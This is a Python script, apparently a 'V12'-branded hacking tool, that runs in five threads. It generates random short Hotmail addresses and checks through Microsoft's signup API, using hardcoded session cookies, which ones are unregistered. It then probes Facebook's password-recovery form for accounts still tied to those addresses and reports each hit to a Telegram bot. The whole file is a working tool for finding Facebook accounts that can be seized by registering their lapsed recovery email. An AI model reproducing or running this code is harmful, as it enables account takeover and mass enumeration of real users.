import requests
import mechanize
import os
from threading import Thread
from user_agent import *
from uuid import uuid4
agent = str(generate_user_agent())

q=0
w=0
e=0
M=0

gre = '\033[2;32m'
red = '\033[1;31m'
red = '\033[1;31m'
yel = '\033[1;33m'
gre = '\033[2;32m'
wh = "\033[1;97m"
ble = '\033[2;36m'
blu = '\033[1;34m' 
F = '\033[1;32m'
Z = '\033[1;31m'

token=input('Enter Token : ')
ID=input('Enter ID : ')
os.system('clear')

def check_Face(ema):
	global q,w,e,M
	email = ema+'@hotmail.com'
	FP = mechanize.Browser()
	FP.set_handle_robots(False)
	FP.open("https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA5Mzk1MzEyLCJjYWxsc2l0ZV9pZCI6NDkyNDY4Nzk4MzkxMDk5fQ%253D%253D&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0wPtFZfYlGQb5KlRU&_rdr")
	FP._factory.is_html = True
	FP.select_form(nr=0)
	FP["email"] = email
	result = FP.submit().read()        
	if "send_email" in str(result):
		M+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Facebook  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {email} 

''')
		ff = f'''
Dev | 𝗩𝟭𝟮
Ibn_Suleiman | @CM_V12

Good Email in Facebook ✅				
••••••••••••••••••••••••••••••••••••••••••••••

Email = {email} 

••••••••••••••••••••••••••••••••••••••••••••••
							'''

		tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}''')
		i = requests.post(tlg)
	else:
		w+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Facebook  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {email} 

''')
		
def check_hot(em):
	global q,w,e,M
	cookies = {
	    'mkt': 'ar-XA',
	    'MicrosoftApplicationsTelemetryDeviceId': 'b8e93f81-51f6-4af4-a498-689fefcf697b',
	    'MUID': 'c6b087823f134e1493964328c7f5f6f6',
	    '_pxvid': 'dfd131fe-6555-11ef-91a5-7e5bf9c5b607',
	    'MSFPC': 'GUID=7ac3f3a7af3646c8ab1d8b530c2de4a3&HASH=7ac3&LV=202408&V=4&LU=1724860499803',
	    'PPLState': '1',
	    'MSPAuth': 'Disabled',
	    'MSPProf': 'Disabled',
	    'NAP': 'V=1.9&E=1dd5&C=b38nDbCIrXFiv1ttn3NRdyQlLvxKzkpUMcuX1NxsrHi4FO-xUtmCMw&W=2',
	    'ANON': 'A=DCCF1D43DA061B07E595D1C5FFFFFFFF&E=1e2f&W=2',
	    'WLSSC': 'EgAdAgMAAAAMgAAAngABXuzCGL4f0PpsOtz7Qf5Kf0LYy0w01DhiUF3aogqw2V3XFScNcXMnUF5NMnt9oh0IvleLeu7Npt+Q2bzVW1/g1l5vopQoKYdi9LftrLea38zKZIQsa7R6bJRPY++kpN0qZt6Bd35J+TXVz7cs0ihqpe7M7s31JReWMFkPV4crg/5cAyDUBQyPf6daJPQ0fmDMCbmhS634jxsvoAWgTjZKuNtqXt2VF1y4h+uorLf239dUf74hSGIX1gmpuj1yuNx6lDsxb1kFTKXhj1PemxxA279pjO1Nq0hZP21psYys6slSTB+85WAEGqbqIqouLPi8lgtYAMWjKEUA4E2sRz3+FQwBfgAMAf9/AwCfnuaEQaHRZiOh0WYQJwAAChGggBARAHF6dGlAb3V0bG9vay5jb20AVgAAHXF6dGklb3V0bG9vay5jb21AcGFzc3BvcnQuY29tAAAAAklRAAAAAAAASAECAACPK1VAAAZDAAZvdGhtYW4ABW9zYW1hAAAAAAAAAAAAAAAAAAAAAAAAW3tSwX2XVVsAAEGh0WYjSEhnAAAAAAAAAAAAAAAADQAzNy43Ny43My4xNjYABAEAAAAAAAAAAAAAAAABBAAAAAAAAAAAAAAAAAAAAKyUcWOctFTIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAA==',
	    'mkt1': 'ar-XA',
	    'amsc': '6j+gULIS+arvZ3Sles50USWOwH8lE6VPPgv59Ue7dGMBmXdFyVNOUb62STOyKUtRHDxwRf+A9lrJXz1syqDLtWjTm8tOMIA15NKiP4NepegrrvFNTrU9YRpibgvErc+kOxsjIl4sCQb7Zhx7iVAUVhkwyoOgxb/gb1RbSeAa9skqFkwmC4HEgSB2mgVEd4foff6gym6854XsABqg3hSUHmrMx9fOZ5BTtjXFaSrDftaeOJoyaNhU7xtUMDnMP/DP/3vcS7WOlk/OfTNbFkNrYTqeMXF0f2kumTLPB+Ugxsw=:2:3c',
	    'ai_session': 'ATcoMbHM4mEt0S8hGfwjRz|1725286837735|1725286837735',
	    'fptctx2': 'taBcrIH61PuCVH7eNCyH0AHEYHVht29NHm46S5qgUjZr%252bQm%252fZD6LfZeq%252bbthjlCw5fo3IrcMLugUlqx72HK1GiasOIe3sU54T2B60wCg9rI4KRsNkUhVJWglANkRTV%252b%252beV%252buzEr55YmMC6rA3ccnZipQK7PCJEy3iOVQRFa1iNBOGcKh7KmX8HXjxs11B%252fWPNi9xr75GHXyIwPw%252fasWQpUuwI%252f3%252bR5m4Zf6ZHiHKvPqqbJ876%252fOL4Ko2D8VBuB7%252b3QAGIF0s9dFtimJcQ0nRE%252f5Y%252bRxuZYULF%252b6SaZHy2JxGH82Z2yteiEPOc5vHy8ywyky3%252fOukvBeIvwBw2LEhFQ%253d%253d',
	    '_px3': '21889a2c574c0ecd1fd18ae1a0fec979c181077783f8fed3bbf311d8bd40404a:y4xqsmefulVZb67cvTOSoBcP/EvLyWB2B/7miHpF/WLtDvIKAhNapMEi2ohlmZknp3gdPuoHhSWt0+nHBesSSg==:1000:rLIg4RWBykiH8Z9zO8bTtTcHwryvdi5jc0Z52PVJSv46I3NIR5Cnl8hvwDLPk2zWMb2kxiczdRwQZz8t6HgepHS46YQPTra4CFIAmRXFR8lKIMzc7BwitvYpfH0V1o/77yExY0licxVzK9l/vgbiWOkM9Tdl05RLODEBPZQE+d4KGS7llR0gTParJ+EQDnkEyZEzDDYh3Ucro32jLSaSFv/XXL/Kf66YKB2SuXcDqkE=',
	    '_pxde': '5765741cc3ca94d125cdd8c8ae221c896fd9a51258c22765b89468ca3e8e0f9f:eyJ0aW1lc3RhbXAiOjE3MjUyODY4NDEyMzgsImZfa2IiOjAsImlwY19pZCI6W119',
	}
	
	headers = {
	    'authority': 'signup.live.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'canary': 'j6d1o4pUvHAi/2IWT0WITnYO95z5ynjLw8BWl9DdNCbvw1a8YvE/W1Yxqggpcf4ivP+ET9/RU8S6c6NnHigAEkP+oAnrU1G/I1CmzN11rPKA7C2vxEAU9DDwodw1jzY9YgHwQf3GBsE+JPvVnunzTwUU5ui3HId/oVYNwhFOJ3RnzPcGgU0D0PMjsDzmgdxFE1CEZhL8teiWs1Mn2GnT4RupbO0D/P+10J62UDFXjCHX+42p2wC4sxkRkGFo6xOk:2:3c',
	    'client-request-id': '4046e2f88bd948e6b1b06f8437b06dbd',
	    'content-type': 'application/json; charset=utf-8',
	    'correlationid': '4046e2f88bd948e6b1b06f8437b06dbd',
	    'hpgact': '0',
	    'hpgid': '200225',
	    'origin': 'https://signup.live.com',
	    'referer': 'https://signup.live.com/signup?mkt=ar-xa&lic=1',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': agent,
	}
	
	params = {
	    'mkt': 'ar-xa',
	    'lic': '1',
	}
	
	json_data = {
	    'includeSuggestions': True,
	    'signInName': f'{em}@hotmail.com',
	    'uiflvr': 1001,
	    'scid': 100118,
	    'uaid': f'{uuid4()}',
	    'hpgid': 200225,
	}
	
	r = requests.post(
	    'https://signup.live.com/API/CheckAvailableSigninNames',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	).text
	if '"isAvailable":true' in r:
		q+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Facebook  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {em}@hotmail.com    
''')
		check_Face(em)
	else:
		e+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{red}[ {gre}𝗩𝟭𝟮 {red}]{gre}Done  ➪  {M}      		
{red}[ {gre}𝗩𝟭𝟮 {red}]{wh}Good Hotmail  ➪  {q}         		    
{red}[ {gre}𝗩𝟭𝟮 {red}]{yel}Bad Facebook  ➪  {w}          			    
{red}[ {gre}𝗩𝟭𝟮 {red}]{red}Bad Hotmail  ➪  {e}   
{red}[ {gre}𝗩𝟭𝟮 {red}]{ble}Email  ➪  {em}@hotmail.com    

''')
		
import random
def us():
  a = 'qwertyuioplkjhgfdsazxcvbnm'
  b = '0987654321'
  ab = a + b
  try:
    while True:
    	X = str("".join(random.choice(ab)for x in range(1)))
    	V = str("".join(random.choice(ab)for x in range(1)))
    	H = str("".join(random.choice(ab)for x in range(1)))
    	P = str("".join(random.choice(ab)for x in range(2)))
    	cc = X + V + H + P
    	check_hot(cc)  
  except :
  	us()
for i in range(5):
  Thread(target=us).start()